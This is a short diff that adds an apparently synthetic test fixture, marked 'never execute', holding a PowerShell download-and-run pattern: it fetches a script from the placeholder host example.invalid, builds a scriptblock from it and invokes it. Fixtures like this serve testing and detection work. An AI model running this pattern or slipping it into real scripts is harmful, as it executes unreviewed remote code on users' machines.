@@ -1,0 +1,4 @@
+# Synthetic academic fixture. Text only: never execute.
+$reply = Invoke-WebRequest -Uri 'https://example.invalid/academic/remote-task.ps1' -UseBasicParsing
+$task = [scriptblock]::Create($reply.Content)
+$task.Invoke()
